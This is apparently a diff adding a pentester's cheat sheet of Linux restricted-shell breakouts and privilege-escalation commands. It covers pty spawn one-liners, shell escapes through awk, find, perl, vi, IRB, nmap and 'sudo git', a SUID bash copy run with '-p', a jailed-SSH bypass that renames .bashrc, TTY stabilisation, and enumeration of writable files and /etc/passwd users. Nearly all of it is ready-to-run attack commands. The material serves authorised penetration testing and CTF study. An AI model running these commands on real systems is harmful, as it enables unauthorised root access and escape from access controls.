@@ -1,0 +1,68 @@
+=================================================
+[ BREAK OUT ]
+python -c 'import pty;pty.spawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+awk 'BEGIN {system("/bin/bash -i")}'
+awk 'BEGIN {system("/bin/sh -i")}'
+nmap --> --interactive
+ed
+!sh
+
+[ Interesting ]
+sh -c 'cp $(which bash) .; chmod +s ./bash'
+./bash -p
+=================================================
+sudo git -p --help
+!/bin/bash //Pagination root Privilege Escalation
+=================================================
+From Within vi, vim, and less
+:set shell=/bin/sh
+:shell
+
+From within IRB:
+exec "/bin/sh"
+
+awk --> awk 'BEGIN {system("/bin/bash")}'
+find --> find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+perl --> perl -e 'exec "/bin/bash";'
+
+1. First for this method, find which bin file 'awk' is in
+find / -name udev -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
+=================================================
+== Jailed SSH Shell?  Try this...              ==
+Initial Shell /bin/sh
+if BASH is blocked.
+Check the 'env' variable!
+Linux will default to /bin/bash default bashrc if there is no present .bashrc
+file in a User's home directory.  Legit Shell...)
+
+1. ssh user@127.0.0.1 "/bin/sh"
+2. cd $HOME
+3. mv .bashrc .bashrc.BAK 
+4. exit
+5. ssh user@127.0.0.1
+
+=================================================
+[+ AND EXPORT PATH]
+python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty;pty.spawn("/bin/bash")'
+export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:~/bin:~/.bin
+export TERM=xterm-256color
+alias ll='clear ; ls -lsaht --color=auto'
+CTRL + Z [Background Process]
+stty -a  [Take note of rows / cols]
+stty raw -echo; fg ; reset
+stty rows 49 cols 200
+
+=================================================
+Once broken out - Before PrivEsc Reference - Perform these commands
+=================================================
+find / -perm -2 ! -type l -ls 2>/dev/null | sort -r
+-------------------------------------------------
+grep -vE 'nologin|false' /etc/passwd
+-------------------------------------------------
+
+=================================================
+Other, Misc
+
+nmap --interactive
+nmap> !sh
